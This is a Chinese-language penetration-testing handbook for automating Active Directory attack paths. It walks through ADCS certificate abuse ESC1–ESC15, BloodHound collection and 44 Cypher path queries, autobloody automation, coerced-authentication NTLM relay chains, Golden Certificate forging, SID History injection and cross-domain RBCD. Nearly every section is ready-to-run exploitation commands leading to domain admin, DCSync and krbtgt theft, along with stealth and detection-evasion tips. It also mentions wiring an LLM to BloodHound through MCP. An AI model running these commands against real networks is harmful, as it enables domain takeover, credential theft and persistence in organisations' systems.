---
name: kb-ad-attack-path-automation
description: 域攻击路径自动化专题纵深手册——ADCS 全链 ESC1-ESC15 利用命令 + BloodHound/SharpHound 深度采集与 40+ Cypher 查询库 + PlumHound/autobloody 路径自动化 + NTLM Relay/强制认证串联 + 跨域跨森林攻击。已按 2024-2026 最新情报修订（ESC13/ESC14/ESC15、CVE-2024-49019 EKUwu、CVE-2025-33073 SMB 反射、BloodHound CE v7.2 NTLM->ADCS 边）
tags: [ADCS, BloodHound, 攻击路径, 域渗透, NTLM Relay, 跨域]
date: 2026-08-14
---

# 域攻击路径自动化：ADCS 与 BloodHound 纵深

> 定位：对《kb_intranet_lateral_domain_2026.md》（域渗透大纲）的**专题纵深**，聚焦「让 BloodHound 画出路径、让 ADCS 变成域管」这条自动化主链。读者需已具备：域内任意账户 / 已控主机权限。每个攻击点给可运行命令 + 中文注释 + 判定门槛。

## 〇、决策树：先打哪条链
```
已获得域内凭据/低权限
├─ 侦察(10min): certipy find -vulnerable + SharpHound -c All
├─ ADCS 有洞? ─→ ESC1/3/6/8/13/14/15 按 §二 逐条打 → 域管
│     （certipy find 直接标出每个 ESC 编号，命中即打）
├─ 无 ADCS 洞 → BloodHound 画最短路径(§三)
│     ├─ 路径有 ACL 写 → ESC4/WriteDACL/ShadowCreds → 升级
│     ├─ 路径有 Relay 边 → 强制认证+NTLM Relay(§五) → 域管
│     └─ 路径有跨域信任 → SID History/跨域 RBCD(§六)
└─ 自动化(可选): PlumHound/autobloody 把以上链脚本化(§四)
```

---

## 一、侦察：枚举 ADCS 漏洞与域数据
```bash
# certipy-ad 全量枚举 + 只标漏洞（主入口，一条命令看全部 ESC）
certipy find -u user@corp.local -p 'Passw0rd' -dc-ip 10.0.0.1 -vulnerable -stdout
#   ESC1: 模板允许指定 SAN + Client Auth EKU + 低权可注册
#   ESC13: 模板发行策略 OID 链接到组 (msDS-OIDToGroupLink)
#   ESC14: 攻击者对目标 altSecurityIdentities 有写权
#   ESC15: V1 模板 + Supply in request（无补丁 CA）
# 全部模板导出 json（含 ESC 归类，供脚本化）
certipy find -u user@corp.local -p 'Passw0rd' -dc-ip 10.0.0.1 -out corp_cas
```
```powershell
# Windows 端 Certify.exe（离线/无 certipy 环境）
Certify.exe find /vulnerable                 # 枚举+漏洞标记
Certify.exe find /vulnerable /currentuser    # 只看当前用户可注册
Certify.exe enum-templates --filter-vulnerable --hide-admins   # ESC15 检出
```
> **判定门槛**：`certipy find -vulnerable` 输出某 ESC ≠ 一定能打，还要核对**注册权限**（当前用户是否在模板 AllowEnroll）与 CA 状态。用 `-debug` 看报错。

---

## 二、ADCS 全链 ESC1–ESC15

### ESC1 —— 注册者自供 SAN（最经典）
原理：模板允许 CSR 指定 SAN + Client Auth EKU + 低权可注册 → 替管理员申请证书 → 证书换 TGT → 拿 NT hash。
```bash
certipy req -u user@corp.local -p 'Passw0rd' -ca CORP-CA -target ca.corp.local \
  -template VulnTemplate -upn administrator@corp.local        # 申请 admin 证书
certipy auth -pfx administrator.pfx -dc-ip 10.0.0.1           # PKINIT → 输出 NT hash+TGT
secretsdump.py -hashes :<NThash> 'CORP/administrator@dc01.corp.local'   # PTH 域管
```
坑：CA 审计记录 admin 证书申请（OPSEC）。

### ESC2 —— Any Purpose / 无 EKU 模板
原理：模板 EKU 为 "Any Purpose"(2.5.29.37.0) 或空（SubCA 型）→ 证书一切用途。利用同 ESC1。
```bash
certipy req -u user@corp.local -p 'Passw0rd' -ca CORP-CA -target ca.corp.local \
  -template AnyPurposeTemplate -upn administrator@corp.local
certipy auth -pfx administrator.pfx -dc-ip 10.0.0.1
```

### ESC3 —— 注册代理 (Enrollment Agent)
原理：①有"注册代理"模板（Certificate Request Agent EKU）；②有允许"代表他人注册"的模板。先拿代理证书，再替目标注册。
```bash
certipy req -u user@corp.local -p 'Passw0rd' -ca CORP-CA -target ca.corp.local -template EnrollmentAgent   # ①申请代理证书
certipy req -u user@corp.local -p 'Passw0rd' -ca CORP-CA -target ca.corp.local \
  -template User -on-behalf-of 'CORP\administrator' -pfx enrollmentagent.pfx    # ②替 admin 注册
certipy auth -pfx administrator.pfx -dc-ip 10.0.0.1
```

### ESC4 —— 模板 ACL 可写
原理：低权用户对证书模板对象有 GenericWrite/WriteDacl → 改模板成 ESC1 条件 → 打完还原。
```bash
certipy template -u user@corp.local -p 'Passw0rd' -template VulnTemplate -save-old -dc-ip 10.0.0.1   # 备份原配置
certipy req -u user@corp.local -p 'Passw0rd' -ca CORP-CA -target ca.corp.local \
  -template VulnTemplate -upn administrator@corp.local
certipy template -u user@corp.local -p 'Passw0rd' -template VulnTemplate -configuration old.json -dc-ip 10.0.0.1   # 还原
```
坑：改模板期间可能被审计（事件 4882 模板变更）；改完立即还原。

### ESC5 / ESC12 —— 历史型（简要）
ESC5：对 CA 的 AD 对象/PKI 容器/NTAuthCertificates 有写权 → 把自建 CA 证书加入 NTAuth 存储 → 自签任意证书。
ESC12：Windows Server 2003 旧 CA 弱加密（MD5 签名+可预测密钥）模板，2022 披露后几乎绝迹，仅老 CA 环境。

### ESC6 —— CA 上 EDITF_ATTRIBUTESUBJECTALTNAME2 开启
原理：CA 注册表 EditFlags 设该标志 → 任意模板都能带 SAN（全局 ESC1）。
```bash
certutil -config "ca.corp.local\CORP-CA" -getreg policy\EditFlags      # 检测
certipy req -u user@corp.local -p 'Passw0rd' -ca CORP-CA -target ca.corp.local -template User -upn administrator@corp.local
certipy auth -pfx administrator.pfx -dc-ip 10.0.0.1
```

### ESC7 —— ManageCA / ManageCertificates 权限
原理：ManageCA → 可启用 SubCA 模板（自带 SAN 能力）；ManageCertificates → 可批准挂起请求。组合即域管。
```bash
certipy ca -u user@corp.local -p 'Passw0rd' -ca CORP-CA -target ca.corp.local -enable-template SubCA -dc-ip 10.0.0.1   # ①启用 SubCA
certipy req -u user@corp.local -p 'Passw0rd' -ca CORP-CA -target ca.corp.local -template SubCA -upn administrator@corp.local   # ②申请→挂起
certipy ca -u user@corp.local -p 'Passw0rd' -ca CORP-CA -target ca.corp.local -issue-request <请求ID> -dc-ip 10.0.0.1         # ③批准
certipy req -u user@corp.local -p 'Passw0rd' -ca CORP-CA -target ca.corp.local -retrieve <请求ID>                              # ④取回
certipy auth -pfx administrator.pfx -dc-ip 10.0.0.1
```

### ESC8 —— NTLM Relay 到 HTTP 注册端点（最实用 relay 链）
原理：CA 开 Web 注册（certsrv）且无强制 HTTPS → 强制 DC 认证 → relay 到 `certfnsh.asp` → 替 DC 机器账户申请证书 → DC hash → DCSync。
```bash
# 终端A: 起 relay 到 CA Web 注册端点
ntlmrelayx.py -t http://ca.corp.local/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
# 终端B: 强制 DC 认证到攻击机（coerce 见 §五）
python3 PetitPotam.py 攻击机IP dc01.corp.local
# 成功后在当前目录生成 dc01.pfx
certipy auth -pfx dc01.pfx -dc-ip 10.0.0.1                    # DC 机器账户 NT hash
secretsdump.py -hashes :<dc01$ hash> 'CORP/dc01$@dc01.corp.local' -just-dc
```
坑：`--template DomainController` 是拿 DC 机器证书的关键；若 CA 校验模板白名单换 `Machine`。SMB 签名/EPA 会拦（见 §五）。

### ESC9 —— 无安全扩展 + 弱证书绑定
原理：模板设 `CT_FLAG_NO_SECURITY_EXTENSION` + DC 的 `StrongCertificateBindingEnforcement=0/1` → SAN 映射不校验证书安全扩展 → 冒充无 UPN 目标。
```bash
# certipy shadow auto：自动改 UPN→申请→还原（GenericWrite 即够，不留痕）
certipy shadow auto -u user@corp.local -p 'Passw0rd' -account victim -dc-ip 10.0.0.1
```
判定：目标**无 UPN** 或模板带 NO_SECURITY_EXTENSION 才成立；DC 上 `StrongCertificateBindingEnforcement=2` 免疫。

### ESC10 —— 弱证书映射（注册表）
原理：DC 的 `CertificateMappingMethods` 含 `0x1`(UPN) 或 `0x4`(SAN) 映射 → 改受害者 UPN 成管理员 → 申请证书 → 改回 → 冒充成功。
```bash
certipy account update -u user@corp.local -p 'Passw0rd' -user victim -upn administrator@corp.local -dc-ip 10.0.0.1  # ①改 UPN
certipy req -u user@corp.local -p 'Passw0rd' -ca CORP-CA -target ca.corp.local -template User -upn administrator@corp.local  # ②申请
certipy account update -u user@corp.local -p 'Passw0rd' -user victim -upn victim@corp.local -dc-ip 10.0.0.1  # ③还原
certipy auth -pfx administrator.pfx -dc-ip 10.0.0.1
```

### ESC11 —— NTLM Relay 到 RPC 注册（ICPR）
原理：CA 开 RPC 注册端点（ICertPassageRemote）且 `IF_ENFORCEENCRYPTICERTREQUEST` 未设 → relay 到 RPC 代替 HTTP。
```bash
ntlmrelayx.py -t rpc://ca.corp.local -rpc-mode ICPR -icpr-ca-name 'CORP-CA' \
  -smb2support --adcs --template DomainController
# 配合 PetitPotam 强制 DC 认证 → 拿 DC 证书（同 ESC8 后续）
```

### ESC13 —— 发行策略 OID 链接组（AMA，2023 发现）
原理：模板发行策略的 OID 对象 `msDS-OIDToGroupLink` 指向**空的全域组** → 用此证书换 TGT 时 KDC 把组 SID 加进 PAC → 临时获得该组权限。
```bash
certipy req -u user@corp.local -p 'Passw0rd' -ca CORP-CA -target ca.corp.local -template ESC13Template
certipy auth -pfx user.pfx -dc-ip 10.0.0.1        # TGT PAC 已含链接组 SID
```
判定：链接组必须**空的全域组**且组权限高（如属 BUILTIN\Administrators）才高危；BloodHound 边 `OIDGroupLink`/`ADCSESC13` 自动标出。

### ESC14 —— altSecurityIdentities 显式证书映射
原理：对目标 `altSecurityIdentities` 有写权 → 写入**强映射**（X509IssuerSerialNumber/X509SKI/X509SHA1PublicKey）→ 用自己的证书冒充目标。证书需链到 DC 信任根 + 签发 CA 在 NTAuth 存储 + 含认证 EKU。
```bash
certipy req -u user@corp.local -p 'Passw0rd' -ca CORP-CA -target ca.corp.local -template Machine   # ①注册机器证书
openssl x509 -in machine.crt -noout -fingerprint -sha1                    # ②提取公钥 SHA1 指纹
certipy alt -u user@corp.local -p 'Passw0rd' -target administrator@corp.local \
  -ca-pfx CORP-CA.pfx -fingerprint <SHA1指纹> -dc-ip 10.0.0.1             # ③写强映射（certipy 4.2+）
certipy auth -pfx machine.pfx -dc-ip 10.0.0.1                             # ④冒充目标
```
坑：证书 SAN **不能含 UPN**（除非 DC 禁用 UPN 映射）；用后删映射收尾。若攻击方 CA 在目标森林 NTAuth 受信 → 可跨森林冒充。

### ESC15 —— EKUwu / CVE-2024-49019（2024.11 补丁）
原理：**V1 架构模板 + "Supply in the request"** → CSR 可注入任意 `msPKI-Certificate-Application-Policy` → 绕过 EKU 白名单。受影响 V1 默认模板：WebServer、ExchangeUser、CEPEncryption、OfflineRouter。注入 Client Auth OID → ESC1 式；注入 Cert Req Agent OID → ESC3 式。
```bash
certipy find -u user@corp.local -p 'Passw0rd' -dc-ip 10.0.0.1 -vulnerable -stdout | grep -i esc15   # 检出
# 利用1: V1 模板注入 Client Auth OID + admin UPN
certipy req -u user@corp.local -p 'Passw0rd' -ca CORP-CA -target ca.corp.local \
  -template WebServer -upn administrator@corp.local -application-policy 1.3.6.1.5.5.7.3.2 -csr custom.csr
# 利用2: 注入 Certificate Request Agent OID → 变注册代理，再走 ESC3
certipy req -u user@corp.local -p 'Passw0rd' -ca CORP-CA -target ca.corp.local \
  -template WebServer -application-policy 1.3.6.1.4.1.311.20.2.1
```
坑（重要）：PKINIT 只认 EKU 扩展 → ESC15 证书**不能直接 `certipy auth` 换 TGT**（报 KDC_ERR_INCONSISTENT_KEY_PURPOSE）；改用 **LDAP Schannel（PassTheCert）**：
```bash
python3 passthecert.py -action modify_user -crt admin.crt -key admin.key \
  -target 'CORP\administrator' -domain corp.local -dc-ip 10.0.0.1 -new-pass 'Pwned123!'   # 改目标密码→域管
```
修复：2024.11 补丁，或把 V1 模板克隆升级为 V2 架构。

### Golden Certificate —— 拿到 CA 私钥后的持久化
```bash
certipy ca -backup -u admin@corp.local -p 'Passw0rd' -ca CORP-CA -target ca.corp.local        # ①备份 CA 私钥
certipy forge -ca-pfx CORP-CA.pfx -upn administrator@corp.local \
  -subject 'CN=Administrator,CN=Users,DC=CORP,DC=LOCAL'                                        # ②伪造任意用户证书
certipy auth -pfx forged.pfx -dc-ip 10.0.0.1                                                  # ③认证即域管
```

---

## 三、BloodHound/SharpHound 深度

### 3.1 采集参数（-c / CollectionMethods）详解
| 方法 | 采集内容 | 权限 |
|------|---------|------|
| Default | 组成员+信任+本地组+会话+ACL+对象属性+SPN | 认证用户(LDAP) |
| Group / ACL / ObjectProps / Trusts / Container | 组成员 / DACL / LastLogon 等属性 / 域信任 / OU | 认证用户 |
| LocalGroup / UserRights | 本地管理员等组 / 用户权限(CanRDP 边) | 目标本地管理员 |
| GPOLocalGroup | 通过 GPO 推断本地组 | 认证用户 |
| Session / LoggedOn | 活跃会话 / 特权会话 | 认证用户 / 本地管理员 |
| DCOnly | 仅 LDAP(Group/Trust/ACL/ObjectProps/Container/GPOLocalGroup) | 认证用户，最静默 |
| CARegistry / DCRegistry / CertServices | CA 注册表 / DC 注册表(NTLM 设置) / ADCS 对象 | 目标本地管理员 / 认证用户 |
| All | 除 GPOLocalGroup 外全部 | 混合 |
> NTLM 中继边（CoerceAndRelayNTLMToLDAP/ADCS/SMB）由 v2.6+ 从 DC/CA 注册表采集，**必须跑 CARegistry+DCRegistry** 才会出现。

### 3.2 SharpHound 常用调用（Windows）
```powershell
.\SharpHound.exe -c All --zipfilename corp_bh                          # 全量采集
.\SharpHound.exe -c DCOnly --Stealth                                   # 静默：只走 LDAP 不打主机
.\SharpHound.exe -c Session,Trusts --Loop --LoopDuration 00:15:00      # 循环采会话（找高权会话）
.\SharpHound.exe -c All --SecureLdap                                    # 走 LDAPS 绕告警
.\SharpHound.exe --MemCache --Loop                                      # 内存缓存，避免落盘
.\SharpHound.exe -c CARegistry,DCRegistry,CertServices                 # ADCS 纵深
```

### 3.3 bloodhound.py（Linux 采集器）
```bash
bloodhound-python -u user -p 'Passw0rd' -d corp.local -ns 10.0.0.1 -c All --zip --dns-tcp
bloodhound-python -u user -p 'Passw0rd' -d corp.local -ns 10.0.0.1 -c DCOnly --use-ldaps
nxc ldap 10.0.0.1 -u user -p 'Passw0rd' --bloodhound --collection All --dns-server 10.0.0.1
```
坑：bloodhound.py 不支持 GPOLocalGroup；DNS 问题加 `--dns-tcp`；DC 记 LDAP 日志（事件 1644）。

### 3.4 40+ 高频 Cypher 查询库（CE Cypher 框直接执行）
```cypher
// ===== A. 到 DA 最短路径 =====
MATCH p=shortestPath((u:User {name:'USER@CORP.LOCAL'})-[r*1..]->(g:Group)) WHERE g.objectid ENDS WITH '-512' RETURN p
MATCH p=shortestPath((u:User)-[*1..4]->(g:Group {name:'DOMAIN ADMINS@CORP.LOCAL'})) WHERE NOT u.admincount RETURN p LIMIT 25
MATCH p=shortestPath((n)-[*1..]->(g:Group)) WHERE n.owned AND g.objectid ENDS WITH '-512' RETURN p
MATCH p=shortestPath((u:User {owned:true})-[*1..]->(g:Group)) WHERE g.highvalue RETURN p LIMIT 50
// ===== B. 高价值目标 =====
MATCH (u:User {hasspn:true}) RETURN u.name, u.admincount                       // Kerberoastable
MATCH (u:User {hasspn:true})-[:MemberOf*1..]->(g:Group)-[:AdminTo]->(c:Computer) RETURN DISTINCT u.name, c.name
MATCH (u:User {dontreqpreauth:true}) RETURN u.name                             // AS-REP Roastable
MATCH (n)-[:DCSync]->(d:Domain) RETURN n.name, d.name                          // DCSync 权限
MATCH (u:User {admincount:true}) RETURN u.name                                 // 高权用户
MATCH (u:User {admincount:true, pwdneverexpires:true}) RETURN u.name
MATCH (n)-[:MemberOf*1..]->(g:Group {name:'DOMAIN ADMINS@CORP.LOCAL'}) RETURN DISTINCT n.name
MATCH (c:Computer {hasspn:true}) RETURN c.name
// ===== C. 委派滥用 =====
MATCH (c:Computer {unconstraineddelegation:true}) RETURN c.name                 // 非约束委派
MATCH (n) WHERE n.allowedtodelegate IS NOT NULL RETURN n.name, n.allowedtodelegate  // 约束委派
MATCH p=(m:Computer)-[:AllowedToAct]->(c:Computer {owned:true}) RETURN p        // RBCD 到我控机
MATCH p=(n)-[:AllowedToAct]->(c:Computer) WHERE NOT c.owned RETURN p            // 跨域 RBCD(TrustedBy)
MATCH (c:Computer {unconstraineddelegation:true})<-[:HasSession]-(u:User {admincount:true}) RETURN c.name, u.name
// ===== D. 会话与横移 =====
MATCH (u:User {admincount:true})-[:HasSession]->(c:Computer) RETURN u.name, c.name
MATCH (u:User {owned:true})-[:AdminTo]->(c:Computer)<-[:HasSession]-(v:User) RETURN u.name, c.name, v.name
MATCH p=shortestPath((u:User {owned:true})-[*1..]->(c:Computer)) WHERE (c)<-[:HasSession]-(:User {admincount:true}) RETURN p LIMIT 10
MATCH p=(u:User {owned:true})-[:CanRDP]->(c:Computer) RETURN p
MATCH p=(n)-[:ReadLAPSPassword]->(c:Computer) WHERE NOT c.owned RETURN p         // LAPS 读取
MATCH (c:Computer)-[:HasSession]->(x) WHERE x.admincount RETURN c.name, x.name
// ===== E. ACL 滥用 =====
MATCH p=(u:User {owned:true})-[:GenericAll]->(n) RETURN p LIMIT 30
MATCH p=(u:User {owned:true})-[:WriteDacl]->(n) RETURN p LIMIT 30               // 给自己加 DCSync
MATCH p=(u:User {owned:true})-[:ForceChangePassword]->(n) RETURN p
MATCH p=(u:User {owned:true})-[:GenericWrite]->(n) RETURN p LIMIT 30            // 影子凭据/altSecID
MATCH p=(u:User {owned:true})-[:AddMember]->(g:Group) RETURN p
MATCH p=(u:User {owned:true})-[:Owns]->(n) RETURN p
MATCH p=(u:User {owned:true})-[:WriteOwner]->(n) RETURN p
MATCH p=(u:User {owned:true})-[:WriteSPN]->(n) RETURN p
// ===== F. ADCS 相关（CertServices 采集后） =====
MATCH p=(n)-[:Enroll]->(t:CertTemplate) RETURN p
MATCH p=shortestPath((n {owned:true})-[*1..]->(g:Group)) WHERE g.objectid ENDS WITH '-512' AND EXISTS { MATCH (n)-[:Enroll]->(:CertTemplate) } RETURN p
MATCH (n)-[r]->(m) WHERE type(r) STARTS WITH 'ADCS' RETURN n.name, type(r), m.name   // v7.2 ADCS 边
MATCH (ca:CA) WHERE ca.ntauth RETURN ca.name                                  // NTAuth 存储 CA
MATCH p=(n)-[:CoerceAndRelayNTLMToLDAP|CoerceAndRelayNTLMToADCS]->(m {owned:true}) RETURN p
// ===== G. GPO / OU =====
MATCH p=(n {owned:true})-[:GpLink|WriteGPO]->(g:GPO) RETURN p                  // 改 GPO→启动脚本 RCE
MATCH p=(u:User {admincount:true})-[:AdminTo]->(c:Computer)-[:GpLink]->(g:GPO) RETURN p
MATCH p=(n)-[:CreateChild]->(ou:OU) RETURN p LIMIT 20                          // BadSuccessor/dMSA
MATCH (g:GPO)-[:Contains]->(u:User) RETURN g.name, u.name
// ===== H. 跨域/信任 =====
MATCH (d:Domain)-[:TrustedBy]->(d2:Domain) RETURN d.name, d2.name
MATCH (d:Domain)-[r:TrustedBy]->(d2:Domain) WHERE NOT r.transitive RETURN d.name, d2.name, r.trusttype
MATCH (u:User) WHERE u.hassidhistory RETURN u.name, u.sidhistory             // SID History 注入候选
MATCH p=(d:Domain)-[:TrustedBy]->(g:Group {highvalue:true}) RETURN p
```
> 用法：CE 右上 Search → Raw Query 执行；结果右键 "Mark owned" 后重跑最短路径，形成"抓一个→标 owned→再找"循环。以上 **44 条**按场景覆盖完整攻击链。

---

## 四、攻击路径自动化
```bash
# PlumHound：把查询变成任务流报表
git clone https://github.com/PlumHound/PlumHound && cd PlumHound && pip install -r requirements.txt
python3 PlumHound.py --easy -p 'neo4jpass' -s 'bolt://127.0.0.1:7687' -t BLOODHOUNDCYCLE1 -r tasks/default.tasks
# 输出 ./reports/；任务文件用 YAML 写死查询与列名，适合巡检/自动找洞

# customqueries.json：一键灌入 40+ 查询（替换后重启 BH；CE 版在 Administration→Custom Queries import）
curl -sSL "https://raw.githubusercontent.com/hausec/Bloodhound-Custom-Queries/master/customqueries.json" -o ~/.config/bloodhound/customqueries.json

# autobloody：Neo4j 算 Dijkstra 最短提权路径 → bloodyAD 自动执行（支持明文/PTH/PTT/证书）
pip install autobloody
autobloody -p 'Password123!' --host 192.168.10.2 -dp 'neo4jP@ss' -ds 'JOHN.DOE@BLOODY.LOCAL' -dt 'BLOODY.LOCAL'

# aclpwn：起点→目标的最短 ACL 提权路径（dry-run 先行）
aclpwn -f CORP\user -t CORP\DomainAdmins --dry-run -d corp.local
# bhcli：命令行访问 BH CE API（裸 Cypher/标 owned）
bhcli --url http://127.0.0.1:8080 --token <API_TOKEN> cypher "MATCH (n) RETURN n LIMIT 5"
```
> 说明：任务书提到的 "Cyclone" 在 2024-2026 开源生态中未见活跃维护的独立工具，社区路径自动化实际主力是 **PlumHound + autobloody + aclpwn + bhcli** 四个；BH CE v7.2 可导出最短路径结果，配合 MCP（sec-bloodhound-mcp）可让 LLM 直接交互 Neo4j。请以这四个工具为准。

---

## 五、NTLM Relay + 强制认证在路径中的串联

### 5.1 relay 目标选择矩阵
| 目标协议 | 能干什么 | 签名要求 | 对应 ESC |
|---------|---------|---------|---------|
| LDAP (389) | RBCD/影子凭据/加机账户/改ACL | DC 默认**不强制** | — |
| LDAPS (636) | 同上（加密） | 需 EPA/channel binding | — |
| HTTP (certsrv) | 证书注册 | 无 | ESC8 |
| RPC (ICPR) | 证书注册 | 无（未强制加密时） | ESC11 |
| SMB | 命令执行（需 admin） | 现代系统默认强制 | — |
| MSSQL | SQL/xp_cmdshell | 无 | — |

### 5.2 强制认证 Coerce 工具（喂给 relay 的"压水器"）
```bash
python3 PetitPotam.py 攻击机IP dc01.corp.local                        # EFSRPC，老 DC 仍在
python3 printerbug.py 'CORP/user:Passw0rd'@dc01.corp.local 攻击机IP   # 打印后台
python3 dfscoerce.py -u user -p 'Passw0rd' -d corp.local dc01.corp.local 攻击机IP
python3 shadowcoerce.py -u user -p 'Passw0rd' -d corp.local dc01.corp.local 攻击机IP
coercer coerce -l 攻击机IP -t dc01.corp.local -u user -p 'Passw0rd' -d corp.local -v   # 全协议喷射
petitpotam 攻击机IP@80/foo 工作站IP        # @80 强制走 WebDAV（HTTP 型 NTLM 无签名问题）
```
> 位置：Coerce=**起点**（逼高权机器账户/DC 主动认证），relay=**中段**（转发到 ADCS/LDAP），certipy auth/secretsdump=**终点**（落权限）。典型全链：
```
PetitPotam(强制DC认证) → ntlmrelayx -t http://CA (ESC8) → dc01.pfx → DCSync → krbtgt → Golden Ticket
mitm6/Responder(被动投毒) → ntlmrelayx -t ldap://DC --delegate-access → RBCD → S4U2Proxy → 冒充任意用户
```

### 5.3 2024-2026 攻防现状（重点）
- **CVE-2025-33073（2025.06 补丁，2025.10 进 KEV）**：Windows SMB 客户端 NTLM 反射 → 只需**在 AD DNS 注册恶意记录**（Authenticated Users 默认允许）+ 配合 PetitPotam/DFSCoerce 强制 lsass 认证 → 反射 SYSTEM 令牌 → 提权域管。**修复：打补丁+收紧 DNS zone ACL**。
- **CVE-2025-54918（2025.09 披露）**：即使 SMB 签名 + LDAP channel binding 全开，通过**剥离 NTLMSSP 的 SEAL/SIGN 标志（保留 MIC）** 仍能 SMB→LDAPS relay。推翻"签名全开就安全"旧认知。
- **BloodHound CE v7.2.0（2025.03）**：原生新增 **NTLM Relay→ADCS** 攻击路径边（配合 SharpHound v2.6+ CARegistry 采集），EnterpriseCA 上建模 ACE（可发现 ESC5/ESC7 类 CA ACL 漏洞）。
- **Impacket（2025）**：Kali 仓库版升级加入新 relay 路径（ntlmrelayx 目标协议扩充 + --adcs 模板协商）。
```bash
crackmapexec smb 10.0.0.0/24 --gen-relay-list relay_targets.txt   # 出"无签名强制"目标清单
crackmapexec ldap 10.0.0.1 -u user -p 'Passw0rd' -M ldap-checker    # 看 LDAP 签名/绑定要求
```

### 5.4 判定门槛与绕过
- **判定**：relay 成功 → 拿到目标协议会话（`--socks` 维持再连）或证书/hash；仅"relay 报 2xx/错误"不算。
- **绕过**：SMB→LDAP 被 MIC 拦 → 换 WebDAV 源（HTTP 型 NTLM 不带签名标志）；LDAP 强制签名 → 换 ADCS(ESC8)/RPC(ESC11) 目标；CA 校验模板 → `--template Machine` 或先 ESC4 改模板。
- **收尾**：relay 改过的对象（RBCD AllowedToAct、影子凭据）用完删除。

---

## 六、跨域 / 跨森林攻击路径

### 6.1 信任枚举
```bash
nltest /domain_trusts /all_trusts        # Windows 本机
Get-NetDomainTrust / Get-NetForestTrust  # PowerView
bloodhound-python ... -c Trusts          # 采集进 BH 看 TrustedBy 边
# 关键属性: trustDirection(3=双向) / trustAttributes(32=父子,8=森林传递,4=外部)
```

### 6.2 SID History 注入（父子域 → 企业管理员）
原理：拿到**子域 krbtgt hash** + 子域/父域 SID → 伪造带父域 EA SID(-519) 的跨域 TGT → 父域 DC 校验 SID History（未开 SID Filtering）→ 企业管理员。
```bash
secretsdump.py -hashes :<DC hash> 'CHILD/user@child.corp.local' -just-dc-user krbtgt   # ①DCSync 子域 krbtgt
python3 ticketer.py -nthash <child krbtgt NT hash> -domain child.corp.local \
  -domain-sid <child SID> -extra-sid <PARENT SID>-519 -user fakeadmin                  # ②注入父域 EA SID
export KRB5CCNAME=fakeadmin.ccache
python3 psexec.py -k -no-pass 'corp.local/Administrator@parentdc.corp.local'          # ③跨域 TGT 访问父域 DC
```
判定门槛：外部/森林信任默认开 **SID Filtering**（拦截非直接信任域 SID）→ 父子域/未过滤环境才成立；`netdom trust /quarantine` 验证。

### 6.3 跨域 RBCD（信任域机账户滥用）
原理：跨域信任下已控域（A）机器账户可对受信任域（B）机器写 `AllowedToAct`（若 B 允许）→ 用 A 机器账户 S4U2Proxy 冒充 B 域任意用户。
```bash
python3 addcomputer.py -computer-name 'EVIL$' -computer-pass 'Passw0rd' 'A.EVIL/user:Passw0rd' -dc-host dcA.corp.local  # ①加机器账户
python3 rbcd.py -delegate-to 'B-DC$' -delegate-from 'EVIL$' -action write 'A.EVIL/user:Passw0rd' -dc-ip dcB.corp.local  # ②写 RBCD
python3 getST.py -spn cifs/b-dc.corp.local -impersonate administrator 'B.EVIL/EVIL$:Passw0rd' -dc-ip dcB.corp.local       # ③S4U2 冒充
python3 wmiexec.py -k -no-pass 'B.EVIL/Administrator@b-dc.corp.local'
```
坑：跨域 RBCD 依赖信任方向与 TGT 可用性；getST.py 会自动走信任请求目标域 TGT。未授权跨域用 `-hashes` 或证书登录。

### 6.4 跨森林路径在 BloodHound 里的表现
采集 Trusts 后跨森林以 `TrustedBy` + `SIDHistory` 边呈现；优先查 §3.4-H 组查询（41-44）找可写信任对象/外部组，再套 §6.2/§6.3 利用。**外域森林信任 + 未开 SID Filtering + 父域 EA 在受信域**是传统黄金组合。

---

## 七、判定门槛与收尾清单
1. **ADCS**：certipy find 标 ESC → 必须 `-upn/-on-behalf-of/-application-policy` 实际拿到证书 + `certipy auth` 输出 NT hash 才算确认。仅"模板可注册"不算。
2. **Relay**：必须拿到目标协议会话/证书/hash（`--socks` 会话能起即证据），仅 HTTP 2xx 不算。
3. **BloodHound 路径**：最短路径≠可利用，需逐跳验证实际权限；`owned` 标记手动维护。
4. **跨域**：SID Filtering 开/关必须先验证，未过滤才可利用。
5. **收尾**：还原模板(ESC4)、删 altSecurityIdentities 映射(ESC14)、删 RBCD AllowedToAct、删添加的机器账户、吊销多余证书。**不造成不可逆破坏是唯一硬边界。**

---

## Sources（2024-2026 查证）
- SpecterOps Certify docs — ESC13/14/15: https://docs.specterops.io/ghostpack-docs/Certify.wik-mdx/esc15-ekuwu-application-policy-injection
- CyCraft — ESC15 EKUwu/CVE-2024-49019: https://www.cycraft.com/en/post/esc15-2024-49019-en-20250908
- Abricto Security — ESC15 Evolution of ADCS Attacks: https://abrictosecurity.com/esc15-the-evolution-of-adcs-attacks/
- Security Boulevard — ADCS ESC13 Abuse: https://securityboulevard.com/2024/02/adcs-esc13-abuse-technique/
- SpecterOps BH Edges — ADCSESC13/OIDGroupLink: https://bloodhound.specterops.io/resources/edges/adcs-esc13
- InternalAllTheThings — ad-adcs-esc14: https://github.com/swisskyrepo/InternalAllTheThings/blob/main/docs/active-directory/ad-adcs-esc14.md
- ly4k/Certipy wiki: https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation
- BloodHound CE Release Notes v7.2.0/v7.2.1: https://bloodhound.specterops.io/resources/release-notes/v7-2-0
- SpecterOps — SharpHound Data Collection: https://bloodhound.specterops.io/collect-data/sharphound-data-permissions
- Compass Security — Stealthy AD CS Recon 2025.02: https://blog.compass-security.com/2025/02/stealthy-ad-cs-reconnaissance/
- Cryptika — CVE-2025-33073 / Impacket relay tricks: https://www.cryptika.com/windows-smb-client-vulnerability-enables-attacker-to-own-active-directory/
- rootsecdev/relay_bible: https://github.com/rootsecdev/relay_bible/blob/main/05-advanced-techniques/cross-protocol.md
- autobloody: https://pypi.org/project/autobloody/ ; https://github.com/CravateRouge/autobloody
- hausec/Bloodhound-Custom-Queries: https://github.com/hausec/Bloodhound-Custom-Queries
- exploide/bhcli: https://github.com/exploide/bhcli
- schwarztim/sec-bloodhound-mcp: https://github.com/schwarztim/sec-bloodhound-mcp
- Hive Security — BH CE Attack Paths 2026: https://hivesecurity.gitlab.io/blog/bloodhound-practical-guide-ad-attack-paths/
- RingSafe — SID History Across AD Trusts: https://ringsafe.in/academy-sid-history-abuse/
